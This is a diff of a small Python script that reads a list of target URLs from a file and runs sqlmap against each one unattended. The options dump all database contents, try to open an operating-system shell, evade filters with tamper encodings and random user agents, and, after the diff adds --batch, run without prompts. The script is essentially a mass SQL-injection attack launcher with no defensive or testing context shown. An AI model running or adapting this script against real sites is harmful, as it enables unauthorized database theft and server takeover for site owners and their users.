@@ -1,7 +1,7 @@
 import os 
 
 list = open("target.txt")
-banner = ("""
+print = ("""
 
                                                 ▄▄   ▄▄  
                                               ▀███   ██  
@@ -22,6 +22,6 @@ banner = ("""
 """)
 
 for each in list:
-    combo="  --all --os-shell --threads=10 --random-agent --time-sec=2 --hex --tamper=chardoubleencode,randomcase --technique=BEUS --code=200 --output-dir=result"
+    combo="  --all --os-shell --threads=10 --random-agent --time-sec=2 --hex --tamper=chardoubleencode,randomcase --technique=BEUS --batch --code=200 --output-dir=result"
     os.system(f"sqlmap --url {each} {combo}")
 
